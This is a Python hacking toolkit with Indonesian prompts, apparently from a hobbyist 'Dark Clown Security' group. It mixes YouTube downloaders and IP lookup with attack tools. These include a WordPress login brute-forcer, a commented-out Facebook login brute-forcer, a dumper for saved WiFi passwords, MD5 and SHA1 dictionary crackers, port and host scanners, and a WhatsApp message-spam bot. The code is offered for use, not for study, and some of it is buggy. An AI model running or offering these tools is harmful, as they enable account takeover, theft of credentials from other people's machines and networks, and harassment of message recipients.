import os, socket, subprocess, time, threading, urllib, wmi, base64, hashlib, requests, sys
import pyautogui as spam
import urllib.request
import urllib.parse
import youtube_dl
import requests
import json
from googletrans import Translator
from pytube import YouTube
from datetime import datetime
from queue import Queue
from bs4 import BeautifulSoup
import platform



if platform.system() == 'Windows':
    hapus = 'cls'
else:
    hapus = 'clear'



def getIP():
    os.system(hapus)
    host = input("url: ")
    print("IP nya: ", socket.gethostbyname(host))

def ceksinyal():
    os.system(hapus)
    os.system("ping 8.8.8.8 -t -l 1000")

def tracerouter():
    os.system(hapus)
    ip = input("IP address target : ")
    results = os.popen("pathping "+str(ip))
    for i in results:
        print(i)

def wifipw():
    os.system(hapus)
    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
    wifis = [line.split(':')[1][1:-1] for line in data if "All User Profile" in line]

    for wifi in wifis:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('utf-8').split('\n')
        results = [line.split(':')[1][1:-1] for line in results if "Key Content" in line]
        try:
            print(f'nama: {wifi}, password: {results[0]}')
        except IndexError:
            print(f'nama: {wifi}, password: tidak di temukan')

def pscan():
    os.system(hapus)
    socket.setdefaulttimeout(0.25)
    print_lock = threading.Lock()
    target = input(" IP Target : ")
    t_IP = socket.gethostbyname(target)
    print(" Mulai menscan target: ", t_IP)

    def portscan(port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            con = s.connect(t_IP, port)
            with print_lock:
                print(port, ' terbuka')
            con.close()
        except:
            pass

    def threader():
        while True:
            worker = q.get()
            portscan(worker)
            q.task_done()

    q = Queue()
    startTime = time.time()

    for x in range(100):
        t = threading.Thread(target=threader)
        t.daemon = True
        t.start()

    for worker in range(1, 700):
        q.put(worker)

    q.join()
    print(" waktu yang digunakan : ", time.time() - startTime)

# def fbbf():
#     email = input("Masukkan email : ")
#     url = "https://free.facebook.com/login.php"
#     wl = open("password.txt", 'r').readlines()

#     for line in wl:
#         password = line.strip()
#         http = requests.post(url, data={'email':email, 'pass':password, 'login':'submit'})
#         if 'notifications.php' in http:
#             print("[+] password benar ",password)
#             sys.exit(1)
#         else:
#             print("[+] password salah ",password)

def md5crack():
    os.system(hapus)
    md5_c = input("Masukan md5 : ")
    pwd = open("password.txt", 'r')
    for password in pwd:
        md5 = hashlib.md5()
        md5.update(password.strip().encode('utf-8'))
        print("Coba Password : ", password.strip())
        if md5_c.strip() == md5.hexdigest():
            print("\nPassword ditemukan : ", password.strip())
            break
    else:
        print("Password Tidak ditemukan")

def sha1crack():
    os.system(hapus)
    sha1_c = input("Masukan sha1 : ")
    pwd = open("password.txt", 'r')
    for password in pwd:
        sha = hashlib.sha1()
        sha.update(password.strip().encode('utf-8'))
        print("Coba Password : ", password.strip())
        if sha1_c.strip() == sha.hexdigest():
            print("\nPassword ditemukan : ", password.strip())
            break
    else:
        print("Password Tidak ditemukan")

def wpbf():
    os.system(hapus)
    purl = input("Masukkan url : ")
    username = input("Masukkan username : ")
    wordlist = open("paswp.txt", 'r').readlines()
    for passwords in wordlist:
        post_data = urllib.parse.urlencode({'username' : username, 'password' : passwords}).encode('ascii')
        post_respon = urllib.request.urlopen(url=purl, data=post_data)
        try:
            idx = post_respon.geturl().index('wp-admin')
        except:
            idx = 0
        if(idx > 0):
            print("Sukses password : ",passwords)
            break
        else:
            print("gagal password : ",passwords)

def tcpsweep():
    os.system(hapus)
    net = input("IP Address : ")
    net1 = net.split(".")
    a = '.'
    net2 = net1[0]+a+net1[1]+a+net1[2]+a
    st1 = int(input("Nomor IP Awal : "))
    en1 = int(input("Nomor IP AKhir : "))
    port = int(input("Nomor Port : "))
    en1=en1+1
    def scan(addr):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((addr,port))
        if result == 0:
            return 1
        else:
            return 0

    def run1():
        for ip in range(st1,en1):
            addr = net2+str(ip)
            if (scan(addr)):
                print(addr, " Hidup")
    run1()

def hashmd5():
    os.system(hapus)
    text = input(" nilai string : ")
    md5 = hashlib.md5()
    md5.update(text.encode("utf-8"))
    print(" nilai hash md5 : ", md5.hexdigest())

def hashsha1():
    os.system(hapus)
    text = input(" nilai string : ")
    sha = hashlib.sha1()
    sha.update(text.encode("utf-8"))
    print(" nilai hash sha1 : ", sha.hexdigest())

def gtrans():
    # sentence = input(" Masukkan teks ...... ")
    translator = Translator()
    translated = translator.translate("halo",src='id', dest='en')         
    print(translated.text) 
  
def ytdown():
    os.system(hapus)
    url = input(" Masukkan url yt : ")
    myVideo = YouTube(url)
    os.system(hapus)
    print("\n")
    print(" ==================== Title video ====================")
    print("")
    print(" Title video : "+myVideo.title)
    print("")
    print(" ================== Thumbnail Video ==================")
    print("")
    print(" Thumbnail video : "+myVideo.thumbnail_url)
    print("")
    print(" ================== Download Video ===================")
    print("")
    # print(myVideo.streams.filter(only_audio=True))
    # print("")
    print(" Mohon tunggu download an selesai")
    
    myVideo.streams.first().download()
    print("")
    print(" ===:.: Download selesai :.:===")

def ytdownmp3():
    os.system(hapus)
    print(" Note : khusus tools ini yt download mp3 ini belum selesai total karena yg kedownload video dan hanya keluar suara bukan benar benar mp3")
    url = input(" Masukkan url yt : ")
    myMusik = YouTube(url)
    os.system(hapus)
    print("\n")
    print(" ==================== Title Musik ====================")
    print("")
    print(" Title Musik : "+myMusik.title)
    print("")
    print(" ================== Thumbnail Musik ==================")
    print("")
    print(" Thumbnail Musik : "+myMusik.thumbnail_url)
    print("")
    print(" ================== Download Musik ===================")
    print("")
    # print(myMusik.streams.filter(only_audio=True))
    # print("")
    print(" Mohon tunggu download an selesai")
    
    myMusik.streams.get_by_itag('140').download()
    print("")
    print(" ===:.: Download selesai :.:===")

def install():
    os.system(hapus)
    print(" Installing kurang lebih membutuhkan waktu 60 detik")
    time.sleep(20)
    os.system(hapus)
    os.system("pip install wmi")
    time.sleep(20)
    os.system("pip install pytube3")
    time.sleep(20)
    os.system("pip install pyautogui")

def spamwapc():

    def loading():
        ank = 0
        while(ank < 12.5):
            print("Silahkan Masuk Ke whatsapp web | ")
            time.sleep(0.1)
            os.system(hapus)
            print("Silahkan Masuk Ke whatsapp web / ")
            time.sleep(0.1)
            os.system(hapus)
            print("Silahkan Masuk Ke whatsapp web - ")
            time.sleep(0.1)
            os.system(hapus)
            print("Silahkan Masuk Ke whatsapp web \ ")
            time.sleep(0.1)
            os.system(hapus)
            ank = ank + 1

    def proges():
        print("Spam Akan Di Mulai")
        print("[                    ] 0% ")
        time.sleep(1)
        os.system(hapus)
        print("zi")
        print("[=====               ] 25%")
        time.sleep(1)
        os.system(hapus)
        print("Spam Akan Di Mulai")
        print("[==========          ] 50%")
        time.sleep(2)
        os.system(hapus)
        print("Spam Akan Di Mulai")
        print("[===============     ] 75%")
        time.sleep(2)
        os.system(hapus)
        print("Spam Akan Di Mulai")
        print("[====================] 100%")
        time.sleep(2)
        os.system(hapus)

    # wb.open("web.whatsapp.com")
    os.system("color a")
    os.system(hapus)
    time.sleep(1)
    print("Note: Harap anda sudah membuka whatsapp web terlebih dahulu")
    nama = input("Masukkan Nama Whatsapp Target : ")
    pesan = input("Masukkan pesan spam : ")
    jumlah = int(input("Masukkan jumlah spam : "))
    time.sleep(2)
    os.system(hapus)

    loading()

    time.sleep(2)
    spam.press("tab")
    time.sleep(2)
    spam.write(nama)
    time.sleep(5)
    spam.press("enter")
    time.sleep(2)
    os.system(hapus)

    proges()

    print("Spam Dimulai")
    count = 0
    while(count < jumlah):
        spam.write(pesan)
        time.sleep(0.1)
        spam.press("enter")
        time.sleep(0.1)
        count = count + 1
        
    os.system(hapus)
    print("Spam Selesai")

def ytmp3():
    print("masukkan link")
    link = input("=> ")

    ydl_opts ={
        'format': 'bestaudio/best',
        'postprocessors': [{
            'key': 'FFmpegExtractAudio',
            'preferredcodec': 'mp3',
            'preferredquality': '320',
        }],
    }

    with youtube_dl.YoutubeDL(ydl_opts) as ydl:
        ydl.download([link])

    print("Download success")

def ipgeo():
    os.system(hapus)
    print('''
     _____ _____     _____            _                     _   _             
    |_   _|  __ \   / ____|          | |                   | | (_)            
      | | | |__) | | |  __  ___  ___ | |     ___   ___ __ _| |_ _  ___  _ __  
      | | |  ___/  | | |_ |/ _ \/ _ \| |    / _ \ / __/ _` | __| |/ _ \| '_ \ 
     _| |_| |      | |__| |  __/ (_) | |___| (_) | (_| (_| | |_| | (_) | | | |
    |_____|_|       \_____|\___|\___/|______\___/ \___\__,_|\__|_|\___/|_| |_|
                    By : AdliXSec   Team : Dark Clown Security     
                                                                
    ''')
    ipaddr = input("Ip Address : ")
    ipreq = requests.get(f"http://ip-api.com/json/{ipaddr}")

    if ipreq.status_code == 200:
        ipdata = json.loads(ipreq.text)

        if ipdata["status"] == "success":
            for key in ipdata:
                print(f"{key.capitalize()} : {ipdata[key]}")
                
                if key == "lon":
                    lat = ipdata["lat"]
                    lon = ipdata["lon"]
                    maps = f"https://www.google.com/maps/@{lat},{lon},9z"
                    print(f"Maps : {maps}")